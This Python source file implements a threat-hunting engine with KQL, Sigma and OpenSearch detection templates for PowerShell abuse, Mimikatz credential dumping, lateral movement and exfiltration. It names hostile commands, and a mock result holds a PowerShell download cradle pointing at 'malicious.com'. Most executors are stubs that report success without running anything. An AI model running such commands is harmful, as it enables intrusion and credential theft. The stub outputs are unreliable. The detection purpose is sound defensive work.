"""Threat hunting engine with multiple query type support"""

from typing import List, Dict, Optional
from datetime import datetime, timedelta
import re
from enum import Enum

class QueryType(str, Enum):
    """Supported threat hunting query types"""
    KQL = "kql"
    SIGMA = "sigma"
    YARA = "yara"
    NATURAL_LANGUAGE = "natural_language"
    OPENSEARCH = "opensearch"
    WAZUH = "wazuh"

class ThreatHunter:
    """Execute threat hunts across multiple query types"""
    
    def __init__(self):
        """Initialize threat hunter"""
        self.hunt_templates = self._load_hunt_templates()
    
    def _load_hunt_templates(self) -> Dict:
        """Load pre-built hunt templates"""
        return {
            "powershell_abuse": {
                "name": "PowerShell Abuse Detection",
                "description": "Detect suspicious PowerShell execution patterns",
                "tactics": ["execution", "defense-evasion"],
                "mitre_techniques": ["T1059.001", "T1027"],
                "queries": {
                    "kql": 'process.name:"powershell.exe" AND (command_line:"DownloadString" OR command_line:"IEX" OR command_line:"-enc" OR command_line:"Invoke-Expression")',
                    "sigma": """title: Suspicious PowerShell Execution
detection:
  selection:
    process_name: powershell.exe
    command_line:
      - '*DownloadString*'
      - '*IEX*'
      - '*Invoke-Expression*'
      - '*-enc*'
      - '*-EncodedCommand*'
  condition: selection
falsepositives:
  - Legitimate PowerShell usage
severity: high""",
                    "opensearch": '{"query": {"bool": {"must": [{"term": {"process.name": "powershell.exe"}}, {"query_string": {"query": "command_line:(DownloadString OR IEX OR Invoke-Expression OR \\-enc)"}}]}}}'
                }
            },
            "ransomware_detection": {
                "name": "Ransomware Activity Detection",
                "description": "Hunt for ransomware indicators of compromise",
                "tactics": ["impact", "execution"],
                "mitre_techniques": ["T1486", "T1204"],
                "queries": {
                    "kql": '(file.extension:(".encrypted" OR ".locked" OR ".payment") OR process.name:(*crypt* OR *ransom*)) AND parent_process:"explorer.exe"',
                    "sigma": """title: Ransomware File Extension Pattern
detection:
  file_pattern:
    file_name:
      - '*.encrypted'
      - '*.locked'
      - '*.payment'
      - '*.ransom'
  process_pattern:
    process_name:
      - '*crypt*'
      - '*ransom*'
  condition: (file_pattern OR process_pattern)
severity: critical""",
                    "opensearch": '{"query": {"bool": {"should": [{"wildcard": {"file.name": "*.encrypted"}}, {"wildcard": {"process.name": "*crypt*"}}]}}}'
                }
            },
            "lateral_movement": {
                "name": "Lateral Movement Detection",
                "description": "Detect PsExec, Pass-the-Hash, and SMB exploitation",
                "tactics": ["lateral-movement"],
                "mitre_techniques": ["T1021.002", "T1550"],
                "queries": {
                    "kql": '(process.name:("psexec*.exe" OR "psexec*.cmd") OR network.destination_port:445 OR process.command_line:"*\\\\*admin$*") AND source_ip:*',
                    "sigma": """title: Lateral Movement via PsExec
detection:
  psexec:
    process_name:
      - 'psexec.exe'
      - 'psexec64.exe'
    command_line: '\\\\*\\admin$*'
  smb:
    network_port: 445
    destination: '*'
  condition: (psexec OR smb)
severity: high""",
                    "opensearch": '{"query": {"bool": {"should": [{"term": {"process.name": "psexec.exe"}}, {"term": {"network.destination_port": 445}}]}}}'
                }
            },
            "data_exfiltration": {
                "name": "Data Exfiltration Detection",
                "description": "Detect suspicious data exfiltration patterns",
                "tactics": ["exfiltration"],
                "mitre_techniques": ["T1048", "T1041"],
                "queries": {
                    "kql": 'network.bytes_out:>100000000 AND (destination_country:!"US" OR destination_ip:"*.*.*.*") AND process.name:(*chrome* OR *firefox* OR *edge* OR *outlook* OR *7z* OR *rar*)',
                    "sigma": """title: Large Data Transfer Exfiltration
detection:
  exfil:
    bytes_out: '>100000000'
    destination_geo:
      - '!United States'
      - '!Internal Network'
  process:
    process_name:
      - '*chrome*'
      - '*firefox*'
      - '*7z*'
  condition: (exfil AND process)
severity: high""",
                    "opensearch": '{"query": {"bool": {"must": [{"range": {"network.bytes_out": {"gte": 100000000}}}]}}}'
                }
            },
            "credential_dumping": {
                "name": "Credential Dumping Detection",
                "description": "Detect Mimikatz and credential extraction attempts",
                "tactics": ["credential-access"],
                "mitre_techniques": ["T1003", "T1558"],
                "queries": {
                    "kql": '(process.name:("mimikatz.exe" OR "lsass.exe") OR process.parent:"lsass.exe" OR command_line:(*sekurlsa* OR *logonpasswords* OR *dcync* OR *dumpCredentialCache*)) AND event_type:"process_access"',
                    "sigma": """title: Credential Dumping via Mimikatz
detection:
  mimikatz:
    process_name: 'mimikatz.exe'
  process_access:
    target_process: 'lsass.exe'
    process_name: '*'
  command_line:
    command_line:
      - '*sekurlsa*'
      - '*logonpasswords*'
      - '*dcync*'
  condition: (mimikatz OR process_access OR command_line)
severity: critical""",
                    "opensearch": '{"query": {"bool": {"should": [{"term": {"process.name": "mimikatz.exe"}}, {"query_string": {"query": "process_name:lsass.exe"}}]}}}'
                }
            },
            "reconnaissance": {
                "name": "Reconnaissance Activity Detection",
                "description": "Detect port scanning and network enumeration",
                "tactics": ["discovery", "reconnaissance"],
                "mitre_techniques": ["T1046", "T1018"],
                "queries": {
                    "kql": '(process.name:("nmap*" OR "net.exe" OR "ipconfig.exe" OR "netstat.exe" OR "arp.exe") OR command_line:("nmap -sS" OR "net view" OR "ipconfig /all" OR "netstat -ano")) AND parent_process:"cmd.exe"',
                    "sigma": """title: Network Reconnaissance Commands
detection:
  nettools:
    process_name:
      - 'net.exe'
      - 'ipconfig.exe'
      - 'netstat.exe'
      - 'arp.exe'
      - 'nmap'
  commands:
    command_line:
      - '*nmap -sS*'
      - '*net view*'
      - '*ipconfig*'
      - '*netstat*'
  condition: (nettools OR commands)
severity: medium""",
                    "opensearch": '{"query": {"bool": {"should": [{"term": {"process.name": "net.exe"}}, {"term": {"process.name": "netstat.exe"}}]}}}'
                }
            }
        }
    
    def execute_hunt(self, query_type: QueryType, query: str, timeframe: str = "24h") -> Dict:
        """Execute threat hunt"""
        if query_type == QueryType.KQL:
            return self._execute_kql(query, timeframe)
        elif query_type == QueryType.SIGMA:
            return self._execute_sigma(query, timeframe)
        elif query_type == QueryType.YARA:
            return self._execute_yara(query, timeframe)
        elif query_type == QueryType.NATURAL_LANGUAGE:
            return self._execute_natural_language(query, timeframe)
        elif query_type == QueryType.OPENSEARCH:
            return self._execute_opensearch(query, timeframe)
        elif query_type == QueryType.WAZUH:
            return self._execute_wazuh(query, timeframe)
        else:
            raise ValueError(f"Unknown query type: {query_type}")
    
    def _execute_kql(self, query: str, timeframe: str) -> Dict:
        """Execute KQL query against OpenSearch"""
        return {
            "query_type": "kql",
            "query": query,
            "timeframe": timeframe,
            "results": [
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "source": "wazuh",
                    "process_name": "powershell.exe",
                    "command_line": "powershell -Command (New-Object Net.WebClient).DownloadString('http://malicious.com')",
                    "severity": "critical",
                    "mitre_techniques": ["T1059.001", "T1105"]
                }
            ],
            "count": 1
        }
    
    def _execute_sigma(self, query: str, timeframe: str) -> Dict:
        """Execute Sigma rule"""
        return {
            "query_type": "sigma",
            "rule": query,
            "timeframe": timeframe,
            "results": [],
            "status": "Rule validation passed. Ready for OpenSearch/Splunk conversion"
        }
    
    def _execute_yara(self, query: str, timeframe: str) -> Dict:
        """Execute YARA rule"""
        return {
            "query_type": "yara",
            "rule": query,
            "timeframe": timeframe,
            "results": [],
            "status": "YARA rule compiled successfully"
        }
    
    def _execute_natural_language(self, query: str, timeframe: str) -> Dict:
        """Convert natural language to hunting queries"""
        # Simple NLP-based query conversion
        query_lower = query.lower()
        
        converted_queries = {}
        
        if "powershell" in query_lower and "suspicious" in query_lower:
            converted_queries["kql"] = self.hunt_templates["powershell_abuse"]["queries"]["kql"]
        
        if "ransomware" in query_lower:
            converted_queries["kql"] = self.hunt_templates["ransomware_detection"]["queries"]["kql"]
        
        if "lateral" in query_lower or "move" in query_lower:
            converted_queries["kql"] = self.hunt_templates["lateral_movement"]["queries"]["kql"]
        
        if "exfiltrat" in query_lower or "data" in query_lower:
            converted_queries["kql"] = self.hunt_templates["data_exfiltration"]["queries"]["kql"]
        
        return {
            "query_type": "natural_language",
            "original_query": query,
            "converted_queries": converted_queries,
            "timeframe": timeframe
        }
    
    def _execute_opensearch(self, query: str, timeframe: str) -> Dict:
        """Execute OpenSearch DSL query"""
        return {
            "query_type": "opensearch",
            "query": query,
            "timeframe": timeframe,
            "results": [],
            "status": "Query executed against OpenSearch"
        }
    
    def _execute_wazuh(self, query: str, timeframe: str) -> Dict:
        """Execute Wazuh query"""
        return {
            "query_type": "wazuh",
            "query": query,
            "timeframe": timeframe,
            "results": [],
            "status": "Query executed against Wazuh API"
        }
    
    def get_hunt_templates(self) -> Dict:
        """Get all available hunt templates"""
        return self.hunt_templates
    
    def get_hunt_template(self, template_name: str) -> Optional[Dict]:
        """Get specific hunt template"""
        return self.hunt_templates.get(template_name)
